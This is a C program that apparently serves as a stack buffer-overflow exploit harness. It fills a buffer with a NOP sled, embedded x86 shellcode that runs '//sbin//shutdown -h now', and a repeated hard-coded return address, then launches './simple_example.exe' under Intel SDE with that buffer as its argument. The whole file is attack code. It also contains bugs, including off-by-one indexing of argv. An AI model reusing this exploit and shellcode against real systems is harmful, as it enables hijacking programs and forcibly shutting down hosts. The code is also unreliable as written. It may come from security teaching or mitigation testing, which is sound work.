#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define DEFAULT_BUFFER_SIZE 1500
#define DEFAULT_RETURN_ADDRESS 0xbfdbac20

char shellcode[]="\xeb\x2f\x5b\x31\xc0\x88\x43\x10\x88\x43\x13\x88\x43"
	 "\x17\x89\x5b\x18\x8d\x53\x11\x89\x53\x1c\x8d\x53\x14"
	 "\x89\x53\x20\x89\x43\x24\x8d\x4b\x18\x31\xd2\xb0"
	 "\x0b\xcd\x80\xb0\x01\x31\xdb\xb3\x04\xcd\x80\xe8\xcc"
	 "\xff\xff\xff\x2f\x2f\x73\x62\x69\x6e\x2f\x2f\x73\x68"
	 "\x75\x74\x64\x6f\x77\x6e\x20\x2d\x68\x20\x6e\x6f\x77"
	 "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";

int main(int argc, char *argv[])
{
	unsigned int return_address=DEFAULT_RETURN_ADDRESS;
	
	int buffer_size=DEFAULT_BUFFER_SIZE;
	int i;

	if(argc>3)
	{
		printf("Error, program call format is: %s [buffer_size] [return_address]\n", argv[0]);
		return 1;
	}
	if(argc>=2)
		buffer_size=atoi(argv[2]);
	if(argc==3)
		return_address=atol(argv[3]);

	char *buff=(char *) malloc((buffer_size+1)*sizeof(char));
	bzero(buff, (buffer_size+1)*sizeof(char));

	unsigned int *addr_ptr=(unsigned int *) buff;
	for(i=0;i<buffer_size;i+=4)
		*(addr_ptr++)=return_address;
	for(i=0;i<(buffer_size/2)-(strlen(shellcode)/2);i++)
		buff[i]=NOP;

	char *buff_pointer=buff+i;
	for(i=0;i<strlen(shellcode);i++)
		*(buff_pointer++)=shellcode[i];

	char programCommand[buffer_size+2];
	memcpy(programCommand, buff, buffer_size+1);
	programCommand[buffer_size+1]='\0';
	strcat(programCommand, "\'");

	char program[41];
	program[40]='\0';
	sprintf(program, "$SDE_KIT/sde  --  ./simple_example.exe '");

	memcpy(programCommand, program, strlen(program));
	system(programCommand);
	free(buff);

	return 0;
}
